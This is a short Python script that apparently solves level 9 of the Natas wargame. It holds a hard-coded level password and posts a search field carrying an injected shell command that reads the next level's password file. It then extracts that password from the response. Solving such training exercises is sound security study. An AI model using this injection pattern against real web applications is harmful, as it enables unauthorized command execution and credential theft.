# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
import base64


def natas9():
    username = "natas9"
    password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
    data = {"needle": ";cat /etc/natas_webpass/natas10;", "submit": "Search"}
    content = post_page(9, username, password, data=data)
    password = re.search(r"(?<=<pre>\n)\w{32}", content)
    if password is None:
        print("Fail to find password")
        return
    print(password.group(0))


if __name__ == "__main__":
    natas9()
